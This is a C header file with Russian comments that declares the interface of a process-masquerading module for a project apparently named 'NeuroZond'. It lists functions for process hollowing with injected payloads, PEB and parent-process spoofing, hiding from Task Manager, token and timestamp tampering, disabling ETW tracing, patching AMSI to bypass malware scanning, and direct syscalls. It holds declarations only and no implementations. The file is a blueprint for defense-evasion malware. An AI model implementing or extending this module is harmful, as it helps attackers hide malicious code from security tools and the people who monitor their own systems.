/**
 * process_masquerade.h - Модуль маскировки процессов
 *
 * Предоставляет функциональность для маскировки процесса под легитимный
 * системный процесс, подделки PEB структуры, изменения имени процесса,
 * и других техник сокрытия процесса от обнаружения.
 */

#ifndef _PROCESS_MASQUERADE_H_
#define _PROCESS_MASQUERADE_H_

#include "../../core/neurozond.h"
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdbool.h>

// Типы маскировки процесса
typedef enum {
    MASQ_TYPE_SYSTEM_PROCESS,    // Маскировка под системный процесс
    MASQ_TYPE_BROWSER,           // Маскировка под браузер
    MASQ_TYPE_ANTIVIRUS,         // Маскировка под антивирус
    MASQ_TYPE_OFFICE,            // Маскировка под офисное приложение
    MASQ_TYPE_CUSTOM             // Пользовательская маскировка
} PROCESS_MASQ_TYPE;

// Флаги маскировки
typedef enum {
    MASQ_FLAG_SPOOF_PEB          = 0x0001, // Подмена информации в PEB
    MASQ_FLAG_MODIFY_TOKEN       = 0x0002, // Модификация токена
    MASQ_FLAG_HIDE_FROM_TASKMGR  = 0x0004, // Скрытие от диспетчера задач
    MASQ_FLAG_FAKE_PARENT        = 0x0008, // Поддельный родительский процесс
    MASQ_FLAG_MODIFY_TIMESTAMP   = 0x0010, // Изменение временных меток
    MASQ_FLAG_HOLLOW_PROCESS     = 0x0020, // Использовать Process Hollowing
    MASQ_FLAG_THREAD_CONTEXT     = 0x0040, // Модифицировать контекст потоков
    MASQ_FLAG_DISABLE_ETW        = 0x0080  // Отключить ETW трассировку
} PROCESS_MASQ_FLAGS;

// Типы событий модуля маскировки
typedef enum {
    MASQ_EVENT_DETECTION_ATTEMPT,    // Попытка обнаружения маскировки
    MASQ_EVENT_PARENT_TERMINATION,   // Завершение родительского процесса
    MASQ_EVENT_TOKEN_VALIDATION,     // Проверка токена безопасности
    MASQ_EVENT_MASQUERADE_FAILURE,   // Сбой маскировки
    MASQ_EVENT_PEB_EXAMINATION       // Исследование PEB
} PROCESS_MASQ_EVENT_TYPE;

// Структура события модуля маскировки
typedef struct {
    PROCESS_MASQ_EVENT_TYPE type;  // Тип события
    DWORD processId;               // ID процесса, вызвавшего событие
    DWORD threadId;                // ID потока
    PVOID contextData;             // Дополнительные данные контекста
    SIZE_T contextSize;            // Размер дополнительных данных
} PROCESS_MASQ_EVENT;

// Тип функции обратного вызова для обработки событий
typedef void (*ProcessMasqEventCallback)(PROCESS_MASQ_EVENT* eventInfo);

// Структура для конфигурации PEB
typedef struct {
    WCHAR imagePathName[MAX_PATH];     // Путь к образу
    WCHAR commandLine[MAX_PATH];       // Командная строка
    WCHAR windowTitle[MAX_PATH];       // Заголовок окна
    WCHAR dllPath[MAX_PATH];           // Путь к загружаемой DLL
    BOOL preventNewDllLoads;           // Предотвратить загрузку новых DLL
    DWORD processParentId;             // ID родительского процесса
} PROCESS_PEB_CONFIG;

// Структура конфигурации модуля маскировки
typedef struct {
    PROCESS_MASQ_TYPE type;            // Тип маскировки
    PROCESS_MASQ_FLAGS flags;          // Флаги маскировки
    WCHAR targetProcessName[MAX_PATH]; // Имя целевого процесса
    PROCESS_PEB_CONFIG pebConfig;      // Конфигурация PEB
    BOOL enableAutoRestore;            // Автоматически восстанавливать при обнаружении
    DWORD detectionCheckInterval;      // Интервал проверки обнаружения (мс)
    ProcessMasqEventCallback callback; // Обратный вызов для событий
} PROCESS_MASQ_CONFIG;

// Инициализация модуля маскировки процессов
NEUROZOND_STATUS ProcessMasq_Initialize(const PROCESS_MASQ_CONFIG* config);

// Освобождение ресурсов модуля
void ProcessMasq_Cleanup(void);

// Применение маскировки к текущему процессу
NEUROZOND_STATUS ProcessMasq_ApplyMasquerade(void);

// Применение маскировки к указанному процессу
NEUROZOND_STATUS ProcessMasq_MasqueradeProcess(
    HANDLE processHandle,
    const PROCESS_MASQ_CONFIG* config
);

// Создание и маскировка нового процесса
NEUROZOND_STATUS ProcessMasq_CreateMasqueradedProcess(
    LPCWSTR applicationName,
    LPWSTR commandLine,
    const PROCESS_MASQ_CONFIG* config,
    LPPROCESS_INFORMATION processInfo
);

// Создание пустого процесса для последующего внедрения кода (Process Hollowing)
NEUROZOND_STATUS ProcessMasq_CreateHollowProcess(
    LPCWSTR targetProcess,
    PVOID payloadData,
    SIZE_T payloadSize,
    LPPROCESS_INFORMATION processInfo
);

// Подмена информации PEB в указанном процессе
NEUROZOND_STATUS ProcessMasq_SpoofProcessPEB(
    HANDLE processHandle,
    const PROCESS_PEB_CONFIG* config
);

// Модификация токена безопасности процесса
NEUROZOND_STATUS ProcessMasq_ModifyProcessToken(
    HANDLE processHandle,
    DWORD privilegeCount,
    LPCWSTR* privileges,
    BOOL enable
);

// Скрытие процесса от диспетчера задач и системных утилит
NEUROZOND_STATUS ProcessMasq_HideFromTaskManager(
    HANDLE processHandle
);

// Подделка родительского процесса
NEUROZOND_STATUS ProcessMasq_SpoofParentProcess(
    HANDLE processHandle,
    DWORD parentProcessId
);

// Модификация временных меток процесса
NEUROZOND_STATUS ProcessMasq_ModifyTimestamps(
    HANDLE processHandle,
    FILETIME creationTime,
    FILETIME exitTime,
    FILETIME kernelTime,
    FILETIME userTime
);

// Отключение ETW (Event Tracing for Windows) для процесса
NEUROZOND_STATUS ProcessMasq_DisableETW(
    HANDLE processHandle
);

// Патчинг AMSI (Anti-Malware Scan Interface) для обхода сканирования
NEUROZOND_STATUS ProcessMasq_PatchAMSI(void);

// Установка обработчика событий
NEUROZOND_STATUS ProcessMasq_SetEventCallback(
    ProcessMasqEventCallback callback
);

// Получение текущей конфигурации маскировки
NEUROZOND_STATUS ProcessMasq_GetCurrentConfig(
    PROCESS_MASQ_CONFIG* config
);

// Проверка наличия активной маскировки
BOOL ProcessMasq_IsMasqueradeActive(void);

// Получение статуса модуля
NEUROZOND_STATUS ProcessMasq_GetStatus(void);

// Временное отключение маскировки
NEUROZOND_STATUS ProcessMasq_TemporarilyDisableMasquerade(void);

// Возобновление маскировки
NEUROZOND_STATUS ProcessMasq_ResumeMasquerade(void);

// Расширенные функции для реализации Direct Syscalls

// Функция прямого системного вызова NtAllocateVirtualMemory
typedef NTSTATUS (NTAPI *PNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

// Функция прямого системного вызова NtProtectVirtualMemory
typedef NTSTATUS (NTAPI *PNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

// Инициализация прямых системных вызовов
NEUROZOND_STATUS ProcessMasq_InitDirectSyscalls(void);

// Выполнение прямого системного вызова
NTSTATUS ProcessMasq_DirectSyscall(
    DWORD syscallNumber,
    PVOID args[],
    DWORD argCount
);

#endif // _PROCESS_MASQUERADE_H_ 